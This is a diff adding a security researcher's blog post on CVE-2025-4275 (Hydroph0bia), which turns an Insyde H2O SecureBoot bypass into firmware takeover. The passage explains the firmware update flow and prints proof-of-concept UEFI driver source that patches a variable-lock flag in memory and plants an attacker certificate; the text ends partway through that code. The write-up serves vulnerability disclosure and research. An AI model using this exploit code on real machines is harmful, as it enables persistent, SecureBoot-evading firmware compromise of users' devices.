@@ -1,0 +1,354 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+        <meta content="text/html; charset=UTF-8" http-equiv="content-type"/>
+        <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+        
+        
+        
+
+        
+
+        
+
+        
+
+        
+        
+        
+
+        <title>Hydroph0bia (CVE-2025-4275) - a bit more than just a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 2</title>
+        
+        <meta name="title" content="Hydroph0bia (CVE-2025-4275) - a bit more than just a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 2">
+        
+        
+        <meta name="generator" content="Zola v0.16.1">
+
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="https://coderush.me/hydroph0bia-part2/">
+        <meta property="og:site_name" content="">
+        <meta property="og:title" content="Hydroph0bia (CVE-2025-4275) - a bit more than just a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 2">
+        
+        
+
+        
+        
+        
+        <link rel="canonical" href="https://coderush.me/hydroph0bia-part2/">
+        
+        <script type="application/ld+json">
+            {
+                
+                "url":"https://coderush.me/hydroph0bia-part2/",
+                "@type":"WebSite",
+                "headline":"Hydroph0bia (CVE-2025-4275) - a bit more than just a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 2",
+                "name":"Hydroph0bia (CVE-2025-4275) - a bit more than just a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 2",
+                
+                "@context":"https://schema.org"
+            }
+        </script>
+        
+        
+        
+        <link rel="stylesheet" href="https://coderush.me/style.css"/>
+        
+    </head>
+    <body theme="auto">
+        <div class="w">
+            <header>
+                
+                
+<p><a href="..">..</a>/hydroph0bia-part2</p>
+<p class="post-meta"><time datetime="2025-06-12">2025-06-12</time></p>
+<h1>Hydroph0bia (CVE-2025-4275) - a bit more than just a trivial SecureBoot bypass for UEFI-compatible firmware based on Insyde H2O, part 2</h1>
+
+            </header>
+            <main class="page-content" aria-label="Content">
+                
+
+
+
+<p><img src="../hydroph0bia-part2/hp2_logo.png" alt="Hydroph0bia logo" /></p>
+<p>This post will again be about a vulnerability I dubbed Hydroph0bia (as a pun on Insyde H2O) aka CVE-2025-4275 or INSYDE-SA-2025002. This part is about pivoting from just a SecureBoot bypass into arbitrary code execution during firmware update and taking over the DXE volume.</p>
+<h1 id="intro">Intro</h1>
+<p>If you don't understand WTF is happening here, please read <a href="../hydroph0bia-part1">part 1</a> first. Already did? Nice, let's continue.</p>
+<p>Previously we learned that setting <em>SecureFlashSetupMode</em> and <em>SecureFlashCertData</em> variables with our custom certificate (in EFI_SIGNATURE_LIST format described in UEFI specification) makes <em>BdsDxe</em> to trust objects that we signed as if they come from Insyde themselves.</p>
+<p>This automatically means that we can run even in boot modes where nothing but Insyde 1st-party code could be running, and impersonate the firmware updater application, but instead of updating anything, we can insert arbitrary modification to the part of the firmware that are not covered by either Intel BootGuard (or similar AMD tech) or Insyde FlashDeviceMap hashing. Since UEFITool NE A70, FDM parsing is natively supported, so before trying the attack on your firmware, check out if you can modify the DXE volume, or have to resort to other option.</p>
+<p>Good (Lenovo IdeaPad 5 Pro 16IAH7):
+<img src="../hydroph0bia-part2/hp2_covered.png" alt="DXE volume is covered by FDM hashing on Lenovo laptop" /></p>
+<p>Bad (HUAWEI MateBook 14 2023):
+<img src="../hydroph0bia-part2/hp2_uncovered.png" alt="DXE volume is not covered by FDM hashing on HUAWEI laptop" /></p>
+<p>Our firmware-under-test doesn't cover the DXE volume by any hashes, so if we could mimic the firmware updater application well enough, we can take over it and do whatever.</p>
+<h1 id="firmware-update">Firmware Update?</h1>
+<p>Let's see how the whole firmware update subsystem works on Insyde H2O:</p>
+<ul>
+<li>Insyde updater OS application puts the update capsule and the flash updater UEFI application onto EFI system partition (at /EFI/Insyde/isflash.bin), sets SecureFlashTrigger=1 into a non-volatile <em>SecureFlashInfo</em> variable (using some proprietary mechanisms over SMM, because the variable is "locked" (write-protected) using VariableLockProtocol before booting the OS), then reboots the machine.</li>
+<li>After reboot a PEI driver <em>SecureFlashPei</em> detects the presence of <em>SecureFlashInfo</em>, checks SecureFlashTrigger to be 1, if so, prevents the flash writing locks from being engaged. This means the firmware will remain writable after PEI phase ends.</li>
+<li>In DXE a driver called <em>SecureFlashDxe</em> also detects the presence of <em>SecureFlashInfo</em>, checks the same trigger value, then registers a special callback for BdsDxe to later call into for starting the update process.</li>
+<li><em>BdsDxe</em> also checks for <em>SecureFlashInfo</em> and the trigger, and calls the function that <em>SecureFlashDxe</em> registered before.</li>
+<li>The callback does some preparations (disables reset capabilities, keyboard combinations, boot devices and other stuff that would possbily interrupt firmware update process), then tries to transfer control to <em>isflash.bin</em> in a rather interesting way.</li>
+</ul>
+<p><img src="../hydroph0bia-part2/hp2_callback.png" alt="Part of SecureFlashCallback showing the control transfer" /></p>
+<p>As you can see, there is no way for an error returned from <em>LoadCertificateToVariable</em> to influence the <em>LoadImage</em> call, so if we shadow SecureFlashCertData variable by using SFCD tool from <a href="../hydroph0bia-part1">part 1</a>, it should be successfully consumed by <em>LoadImage</em>, or custom-cert-singed isflash.bin should be started, and exploitation should be complete.</p>
+<p>Of course, the first attempt at it predictably doesn't work, because of somewhat a sanity check or maybe even a naive countermeasure against our attack, that was absent in <em>BdsDxe</em> before.
+<img src="../hydroph0bia-part2/hp2_loadcert.png" alt="LoadCertificateToVariable from SecureFlashDxe" /></p>
+<p>Turns out Insyde decided to first call <em>SetVariable</em> on <em>SecureFlashCertData</em> in a way that will remove all normal NVRAM variables, both volatile and non-volatile. However, thanks to UEFI SecureBoot yet again there are not one, but two different kinds of variables that aren't normal and will not be removed by this call - the old and deprecated Authenticated Write (AW) and the new fancier Time-Based Authenticated Write (TA).
+Moreover, as we are executing in BDS phase, we could even use the VariableLockProtocol to make this call fail (silently, once again, who needs to check the return values, amirite?) without setting special variables, but this idea came into my head way later than I already finished reversing the <em>VariableRuntimeDxe</em> driver and achieved re-setting <em>SecureFlashCertData</em> from NV+BS+RT into NV+BS+RT+AW, which made it as strongly protected from naive SetVarible calls as everything else that the fimware really doesn't want random callers to temper with (i.e. firmware password and alike).</p>
+<h1 id="special-variables">Special Variables?</h1>
+<p>Way back in the 2000s Intel (and later UEFI that they formed around EFI) decided to provide a reference implementation for UEFI variable services, but did not require it to be used (by not putting it into UEFI Platform Interface specification). This lead to several completely different implementations of NVRAM, each having their own issues and quirks. Here we need to dig deep enough into the Insyde H2O variant to see how we can set a custom special variable and make sure it can't be deleted by a stray SetVariable call.</p>
+<p>Insyde implements UEFI variable services in a <em>VariableRuntimeDxe</em> driver, which is starting very early in DXE by the virtue of <em>DXE Apriori File</em> (a list of drivers so important to DXE that the core starts them before usual dispatching).</p>
+<p><em>VariableRuntimeDxe</em> is a giant driver to reverse, so that part was rather <strong>fun</strong>, but after around two weeks of bashing my head against this wall of disassembly and decompilation I've found out the following:</p>
+<ul>
+<li>No custom TA variables can be set, because there's a complete list of them, all relevant to UEFI SecureBoot.</li>
+<li>Insyde uses AW variables for storing firmware password and similar things, and there is a very obscure kind of custom AW variables (I expect that code to never ever been called or tested before) that can only be set before the start of BDS.</li>
+<li>There are no other special custom variables.</li>
+</ul>
+<p>This means we are left with an interesting situation - we could be able to set our <em>SecureFlashCertData</em> as a special Insyde AW variable if we could run before BdsDxe, but our callback is executing by BdsDxe, so we are in sort of chicken-and-egg stalemate.</p>
+<p>Now we need to see how exactly <em>VariableRuntimeDxe</em> does its "disable support for setting AW variables", and see if we can maybe prevent it from doing so, or revert that decision somehow. Hooking <em><a href="https://uefi.org/specs/PI/1.8/V2_DXE_Architectural_Protocols.html#boot-device-selection-bds-architectural-protocol">BdsArchProtocol</a>-&gt;Entry</em> can be done is several ways, and in most cases the hook can be found by searching for uses of BDS_ARCH_PROTOCOL_GUID:
+<img src="../hydroph0bia-part2/hp2_locatebdsarch.png" alt="Registration of BdsEntryHook in VariableRuntimeDxe" /></p>
+<p>Then we can immediately see the hook that is getting registered:
+<img src="../hydroph0bia-part2/hp2_bdsentryhook.png" alt="BdsEntryHook function in VariableRuntimeDxe" /></p>
+<p>And the function that will be called instead of the original <em>BdsArchProtocol-&gt;Entry</em>:
+<img src="../hydroph0bia-part2/hp2_custombdsentry.png" alt="CustomBdsEntry function in VariableRuntimeDxe" /></p>
+<p>Huh, so it looks like the only thing that prevents us from setting custom AW variables is a global flag inside VariableRuntimeDxe that we need to find and flip from 1 back to 0 (let's call it <em>InsydeVariableLock</em> then). Because <em>VariableRuntimDxe</em> starts very early, it is almost always (not sure about every possible case, but it is true for every firmware I've tried so far) the very first driver that hooks <em>BdsArchProtocol-&gt;Entry</em>, meaning that once the protocol will get published, our hook will be the very last (as they are processed in LIFO order), meaning that if we locate <em>BdsArchProtocol</em> from the callback discussed above, the <em>BdsArchProtocol-&gt;Entry</em> there is our <em>CustomBdsEntry</em>.</p>
+<h1 id="variable-lock">Variable Lock?</h1>
+<p>To trigger the firmware update process we need to somehow bypass write protection of <em>SecureFlashInfo</em> variable, that is protected by <em><a href="https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Include/Protocol/VariableLock.h">VariableLockProtocol</a></em>. This is what Intel wants that protocol to do:</p>
+<blockquote>
+<p>Variable Lock Protocol is related to EDK II-specific implementation of variables
+and intended for use as a means to mark a variable read-only after the event
+EFI_END_OF_DXE_EVENT_GUID is signaled.</p>
+</blockquote>
+<p>As customary in UEFI land this is an <strong>utter bullshit</strong>, because one of the main uses of VariableLock is to lock <em>Setup</em> variable, and locking it at EndOfDxe will make BIOS Setup application unusable. Instead, <em>BdsDxe</em> locks all variables marked by <em>VariableLockProtocol-&gt;RequestToLock</em> right before transferring control to the bootloader, which is late enough for all non-bootloader kinds of external things to already getting executed. We do now want to mess with OptionROMs here just yet, but there's another obscure mechanism to run UEFI drivers early in BDS - <a href="https://uefi.org/specs/UEFI/2.10_A/03_Boot_Manager.html">DriverXXXX</a>:</p>
+<blockquote>
+<p>Each Driver#### variable contains an EFI_LOAD_OPTION. Each load option variable is appended with a unique number, for example Driver0001, Driver0002, etc.</p>
+</blockquote>
+<blockquote>
+<p>The DriverOrder variable contains an array of UINT16’s that make up an ordered list of the Driver#### variable. The first element in the array is the value for the first logical driver load option, the second element is the value for the second logical driver load option, etc. The DriverOrder list is used by the firmware’s boot manager as the default load order for UEFI drivers that it should explicitly load.</p>
+</blockquote>
+<p>If we put our code into an UEFI Driver and arm it for DriverXXXX, it will run earlier than VariableLock is engaged, effectively bypassing it. This can be easily done in a modern UEFI shell using <em>bcfg driver add</em> command, and we are able to run our driver and UEFI shell because of the vulnerability that allows us to run whatever regardless of SecureBoot state.</p>
+<h1 id="uefi-driver">UEFI Driver?</h1>
+<p>I have some experience in writing UEFI drivers already, so for me this part was trivial. If you want to learn how to write such driver, <a href="https://tianocore-docs.github.io/edk2-UefiDriverWritersGuide/draft/">UEFI Driver Writer's Guide</a> covers a lot of things, and you can check out open source UEFI drivers like <a href="https://github.com/LongSoft/CrScreenshotDxe">CrScreenshotDxe</a> as a source of inspiration.</p>
+<p>This is the full source of our driver:</p>
+<pre data-lang="cpp" style="background-color:#2b303b;color:#c0c5ce;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">Uefi.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">Library/UefiDriverEntryPoint.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">Library/UefiBootServicesTableLib.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">Library/UefiRuntimeServicesTableLib.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">Protocol/Bds.h</span><span>&gt;
+</span><span>
+</span><span style="color:#b48ead;">#pragma</span><span> pack(push, 1)
+</span><span style="color:#b48ead;">typedef struct </span><span>{
+</span><span>    UINT32 ImageSize;
+</span><span>    UINT64 ImageAddress;
+</span><span>    BOOLEAN SecureFlashTrigger;
+</span><span>    BOOLEAN ProcessingRequired;
+</span><span>} SECURE_FLASH_INFO;
+</span><span>
+</span><span style="color:#b48ead;">typedef struct </span><span>{
+</span><span>  UINT8 Byte48;
+</span><span>  UINT8 Byte8B;
+</span><span>  UINT8 Byte05;
+</span><span>  UINT32 RipOffset;
+</span><span>  UINT8 ByteC6;
+</span><span>  UINT8 Byte80;
+</span><span>  UINT32 RaxOffset;
+</span><span>  UINT8 Value;
+</span><span>} VARIABLE_RUNTIME_BDS_ENTRY_HOOK;
+</span><span style="color:#b48ead;">#pragma</span><span> pack(pop)
+</span><span>
+</span><span style="color:#b48ead;">#define </span><span>WIN_CERT_TYPE_EFI_GUID </span><span style="color:#d08770;">0x0EF1
+</span><span>
+</span><span>STATIC UINT8 VariableBuffer[] = {
+</span><span>    </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#65737e;">// MonotonicCount
+</span><span>    </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#65737e;">//AuthInfo.Hdr.dwLength
+</span><span>    </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#65737e;">//AuthInfo.Hdr.wRevision
+</span><span>    </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#65737e;">//AuthInfo.Hdr.wCertificateType
+</span><span>    </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#65737e;">// AuthInfo.CertType
+</span><span>    </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#65737e;">// AuthInfo.CertType
+</span><span>    </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#65737e;">// CertData
+</span><span>    </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#d08770;">0x00</span><span>, </span><span style="color:#65737e;">// CertData
+</span><span>    </span><span style="color:#65737e;">// Certificate in EFI_CERTIFICATE_LIST format
+</span><span>    </span><span style="color:#d08770;">0xa1</span><span>, </span><span style="color:#d08770;">0x59</span><span>, </span><span style="color:#d08770;">0xc0</span><span>, </span><span style="color:#d08770;">0xa5</span><span>, </span><span style="color:#d08770;">0xe4</span><span>, </span><span style="color:#d08770;">0x94</span><span>, </span><span style="color:#d08770;">0xa7</span><span>, </span><span style="color:#d08770;">0x4a</span><span>, </span><span style="color:#d08770;">0x87</span><span>, </span><span style="color:#d08770;">0xb5</span><span>, </span><span style="color:#d08770;">0xab</span><span>, </span><span style="color:#d08770;">0x15</span><span>,
+</span><span>    ...
+</span><span>    </span><span style="color:#d08770;">0xb4</span><span>, </span><span style="color:#d08770;">0xf5</span><span>, </span><span style="color:#d08770;">0x2d</span><span>, </span><span style="color:#d08770;">0x68</span><span>, </span><span style="color:#d08770;">0xe8
+</span><span>};
+</span><span>UINTN VariableSize = </span><span style="color:#d08770;">48 </span><span>+ </span><span style="color:#d08770;">857</span><span>;
+</span><span>
+</span><span>EFI_GUID gSecureFlashVariableGuid = { </span><span style="color:#d08770;">0x382af2bb</span><span>, </span><span style="color:#d08770;">0xffff</span><span>, </span><span style="color:#d08770;">0xabcd</span><span>, {</span><span style="color:#d08770;">0xaa</span><span>, </span><span style="color:#d08770;">0xee</span><span>, </span><span style="color:#d08770;">0xcc</span><span>, </span><span style="color:#d08770;">0xe0</span><span>, </span><span style="color:#d08770;">0x99</span><span>, </span><span style="color:#d08770;">0x33</span><span>, </span><span style="color:#d08770;">0x88</span><span>, </span><span style="color:#d08770;">0x77</span><span>} };
+</span><span>EFI_GUID gInsydeSpecialVariableGuid = { </span><span style="color:#d08770;">0xc107cfcf</span><span>, </span><span style="color:#d08770;">0xd0c6</span><span>, </span><span style="color:#d08770;">0x4590</span><span>, {</span><span style="color:#d08770;">0x82</span><span>, </span><span style="color:#d08770;">0x27</span><span>, </span><span style="color:#d08770;">0xf9</span><span>, </span><span style="color:#d08770;">0xd7</span><span>, </span><span style="color:#d08770;">0xfb</span><span>, </span><span style="color:#d08770;">0x69</span><span>, </span><span style="color:#d08770;">0x44 </span><span>,</span><span style="color:#d08770;">0xb4</span><span>} };
+</span><span>
+</span><span>EFI_STATUS
+</span><span>EFIAPI
+</span><span style="color:#8fa1b3;">SetCertAsInsydeSpecialVariable </span><span>(
+</span><span>  VOID
+</span><span>  )
+</span><span>{
+</span><span>  EFI_STATUS Status;
+</span><span>  UINT32 Attributes = EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
+</span><span>                 EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_AUTHENTICATED_WRITE_ACCESS;
+</span><span>  EFI_VARIABLE_AUTHENTICATION *CertData = (EFI_VARIABLE_AUTHENTICATION *)VariableBuffer;
+</span><span>  
+</span><span>  CertData-&gt;</span><span style="color:#bf616a;">AuthInfo</span><span>.</span><span style="color:#bf616a;">Hdr</span><span>.</span><span style="color:#bf616a;">dwLength </span><span>= VariableSize;
+</span><span>  CertData-&gt;</span><span style="color:#bf616a;">AuthInfo</span><span>.</span><span style="color:#bf616a;">Hdr</span><span>.</span><span style="color:#bf616a;">wRevision </span><span>= </span><span style="color:#d08770;">0x0200</span><span>;
+</span><span>  CertData-&gt;</span><span style="color:#bf616a;">AuthInfo</span><span>.</span><span style="color:#bf616a;">Hdr</span><span>.</span><span style="color:#bf616a;">wCertificateType </span><span>= WIN_CERT_TYPE_EFI_GUID;
+</span><span>  </span><span style="color:#bf616a;">gBS</span><span>-&gt;</span><span style="color:#bf616a;">CopyMem</span><span>(&amp;CertData-&gt;</span><span style="color:#bf616a;">AuthInfo</span><span>.</span><span style="color:#bf616a;">CertType</span><span>, &amp;</span><span style="color:#bf616a;">gInsydeSpecialVariableGuid</span><span>, sizeof(EFI_GUID));
+</span><span>  
+</span><span>  Status = </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">SetVariable</span><span>(
+</span><span>                  </span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashCertData</span><span>&quot;,
+</span><span>                  &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>,
+</span><span>                  Attributes,
+</span><span>                  VariableSize,
+</span><span>                  VariableBuffer
+</span><span>                  );
+</span><span>  </span><span style="color:#b48ead;">return</span><span> Status;
+</span><span>}
+</span><span>
+</span><span>EFI_STATUS
+</span><span>EFIAPI
+</span><span style="color:#8fa1b3;">SecureFlashPoCEntry </span><span>(
+</span><span>    IN EFI_HANDLE        </span><span style="color:#bf616a;">ImageHandle</span><span>,
+</span><span>    IN EFI_SYSTEM_TABLE *SystemTable
+</span><span>    )
+</span><span>{
+</span><span>    EFI_STATUS Status;
+</span><span>    SECURE_FLASH_INFO SecureFlashInfo;
+</span><span>    UINT32 Attributes;
+</span><span>    UINTN Size = </span><span style="color:#d08770;">0</span><span>;
+</span><span>        
+</span><span>    </span><span style="color:#65737e;">//
+</span><span>    </span><span style="color:#65737e;">// This driver needs to do the following:
+</span><span>    </span><span style="color:#65737e;">// 1. Add AW attribute to SecureFlashCertData variable that is already set as NV+BS+RT
+</span><span>    </span><span style="color:#65737e;">//    This will ensure that SecureFlashDxe driver will fail to remove it
+</span><span>    </span><span style="color:#65737e;">// 2. Set SecureFlashTrigger=1 in SecureFlashInfo variable, 
+</span><span>    </span><span style="color:#65737e;">//    that should have been write-protected by EfiVariableLockProtocol, but isn&#39;t,
+</span><span>    </span><span style="color:#65737e;">//    because we are running from Driver0000 before ReadyToBoot event is signaled.
+</span><span>    </span><span style="color:#65737e;">//    This will ensure that SecureFlashPei and other relevant drivers will not enable
+</span><span>    </span><span style="color:#65737e;">//    flash write protections, and SecureFlashDxe will register a handler
+</span><span>    </span><span style="color:#65737e;">//    that will ultimately LoadImage/StartImage our payload stored in EFI/Insyde/isflash.bin
+</span><span>    </span><span style="color:#65737e;">//
+</span><span>    </span><span style="color:#65737e;">// All further cleanup can be done after getting control from SecureFlashDxe.
+</span><span>    </span><span style="color:#65737e;">//
+</span><span>    </span><span style="color:#65737e;">// All variables used for exploitation will be cleaned 
+</span><span>    </span><span style="color:#65737e;">//    by the virtue of not having them in the modified BIOS region
+</span><span>    </span><span style="color:#65737e;">//
+</span><span>        
+</span><span>    </span><span style="color:#65737e;">// Locate BDS arch protocol
+</span><span>    EFI_BDS_ARCH_PROTOCOL *Bds = </span><span style="color:#d08770;">NULL</span><span>;
+</span><span>    Status = </span><span style="color:#bf616a;">gBS</span><span>-&gt;</span><span style="color:#bf616a;">LocateProtocol</span><span>(&amp;</span><span style="color:#bf616a;">gEfiBdsArchProtocolGuid</span><span>, </span><span style="color:#d08770;">NULL</span><span>, (VOID**) &amp;Bds);
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">EFI_ERROR</span><span>(Status)) {
+</span><span>      </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">SetVariable</span><span>(</span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashPoCError1</span><span>&quot;, &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>, </span><span style="color:#d08770;">7</span><span>, sizeof(Status), &amp;Status);
+</span><span>      </span><span style="color:#b48ead;">return</span><span> Status;
+</span><span>    }
+</span><span>    
+</span><span>    </span><span style="color:#65737e;">// The function pointer we have at Bds-&gt;BdsEntry points to the very top of the hook chain, we need to search it
+</span><span>    </span><span style="color:#65737e;">// for the following:
+</span><span>    </span><span style="color:#65737e;">// 48 8B 05 XX XX XX XX ; mov rax, cs:GlobalVariableArea
+</span><span>    </span><span style="color:#65737e;">// C6 80 CD 00 00 00 01 ; mov byte ptr [rax + 0CDh], 1 ; Locked = TRUE;
+</span><span>    </span><span style="color:#65737e;">// 48 FF 25 YY YY YY YY ; jmp cs:OriginalBdsEntry
+</span><span>    
+</span><span>    </span><span style="color:#65737e;">// Read bytes from memory at Bds-&gt;Entry until we encounter 48 FF 25 pattern
+</span><span>    UINT8* Ptr = (UINT8*)Bds-&gt;</span><span style="color:#bf616a;">Entry</span><span>;
+</span><span>    </span><span style="color:#b48ead;">while </span><span>(Ptr[Size] != </span><span style="color:#d08770;">0x48 </span><span>|| Ptr[Size+</span><span style="color:#d08770;">1</span><span>] != </span><span style="color:#d08770;">0xFF </span><span>|| Ptr[Size+</span><span style="color:#d08770;">2</span><span>] != </span><span style="color:#d08770;">0x25</span><span>) {
+</span><span>      Size++;
+</span><span>      </span><span style="color:#b48ead;">if </span><span>(Size == </span><span style="color:#d08770;">0x100</span><span>) </span><span style="color:#b48ead;">break</span><span>; </span><span style="color:#65737e;">// Put a limit to memory read in case it all fails
+</span><span>    }
+</span><span>    
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(Size == </span><span style="color:#d08770;">0x100</span><span>) {
+</span><span>      </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">SetVariable</span><span>(</span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashPoCError2</span><span>&quot;, &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>, </span><span style="color:#d08770;">7</span><span>, Size, Ptr);
+</span><span>      </span><span style="color:#b48ead;">return</span><span> EFI_NOT_FOUND;
+</span><span>    }
+</span><span>    
+</span><span>    </span><span style="color:#65737e;">// VariableRuntimeDxe is loaded from AprioriDxe before all the other drivers that could have hooked Bds-&gt;Entry, to our hook will be the very first
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(Size != sizeof(VARIABLE_RUNTIME_BDS_ENTRY_HOOK)) {
+</span><span>      </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">SetVariable</span><span>(</span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashPoCError3</span><span>&quot;, &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>, </span><span style="color:#d08770;">7</span><span>, Size, Ptr);
+</span><span>      </span><span style="color:#b48ead;">return</span><span> EFI_NOT_FOUND;
+</span><span>    }
+</span><span>    
+</span><span>    </span><span style="color:#65737e;">// It is indeed the very first one, proceed
+</span><span>    VARIABLE_RUNTIME_BDS_ENTRY_HOOK *Hook = (VARIABLE_RUNTIME_BDS_ENTRY_HOOK*)Bds-&gt;</span><span style="color:#bf616a;">Entry</span><span>;
+</span><span>    
+</span><span>    </span><span style="color:#65737e;">// Make sure we have all expected bytes at expected offsets
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(Hook-&gt;</span><span style="color:#bf616a;">Byte48 </span><span>!= </span><span style="color:#d08770;">0x48 </span><span>|| Hook-&gt;</span><span style="color:#bf616a;">Byte8B </span><span>!= </span><span style="color:#d08770;">0x8B </span><span>|| Hook-&gt;</span><span style="color:#bf616a;">Byte05 </span><span>!= </span><span style="color:#d08770;">0x05 </span><span>|| Hook-&gt;</span><span style="color:#bf616a;">ByteC6 </span><span>!= </span><span style="color:#d08770;">0xC6 </span><span>|| Hook-&gt;</span><span style="color:#bf616a;">Byte80 </span><span>!= </span><span style="color:#d08770;">0x80</span><span>) {
+</span><span>      </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">SetVariable</span><span>(</span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashPoCError4</span><span>&quot;, &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>, </span><span style="color:#d08770;">7</span><span>, Size, Ptr);
+</span><span>      </span><span style="color:#b48ead;">return</span><span> EFI_NOT_FOUND;
+</span><span>    }
+</span><span>      
+</span><span>    </span><span style="color:#65737e;">// Check the current value of InsydeVariableLock
+</span><span>    EFI_PHYSICAL_ADDRESS VariableRuntimeDxeGlobals = *(EFI_PHYSICAL_ADDRESS*)(Ptr + </span><span style="color:#d08770;">7 </span><span>+ Hook-&gt;</span><span style="color:#bf616a;">RipOffset</span><span>); </span><span style="color:#65737e;">// 7 bytes is for the 48 8B 05 XX XX XX XX bytes of first instruction
+</span><span>    UINT8* InsydeVariableLock = (UINT8*)(VariableRuntimeDxeGlobals + Hook-&gt;</span><span style="color:#bf616a;">RaxOffset</span><span>);
+</span><span>    
+</span><span>    </span><span style="color:#65737e;">// Flip it to 0 if it was 1
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(*InsydeVariableLock == </span><span style="color:#d08770;">1</span><span>) {
+</span><span>      *InsydeVariableLock = </span><span style="color:#d08770;">0</span><span>;
+</span><span>    }
+</span><span>    </span><span style="color:#65737e;">// Bail if it&#39;s something else
+</span><span>    </span><span style="color:#b48ead;">else </span><span>{
+</span><span>      </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">SetVariable</span><span>(</span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashPoCError5</span><span>&quot;, &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>, </span><span style="color:#d08770;">7</span><span>, sizeof(UINT8), &amp;InsydeVariableLock);
+</span><span>      </span><span style="color:#b48ead;">return</span><span> EFI_NOT_FOUND;
+</span><span>    }
+</span><span>    
+</span><span>    </span><span style="color:#65737e;">// Try removing the current NV+BS+RT certificate variable (it might already be set as AW, removal will fail in this case)
+</span><span>    Status = </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">SetVariable</span><span>(</span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashCertData</span><span>&quot;, &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">NULL</span><span>);
